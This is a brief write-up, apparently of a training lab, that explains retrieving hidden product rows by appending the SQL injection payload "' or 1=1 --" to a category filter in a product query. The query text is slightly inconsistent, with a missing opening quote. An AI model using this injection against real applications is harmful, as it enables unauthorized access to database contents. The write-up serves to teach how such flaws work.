Goals : is to retreive the products details located on the product category

The sql query used :
SELECT *  FROM products WHERE category=Gifts 

The solution is :
 
To add a conditional statment always true which will always show all product 
like 1=1

So The query will be :

SELECT *  FROM products WHERE category=Gifts' or 1=1 --

1=1 is true so it will show all products details
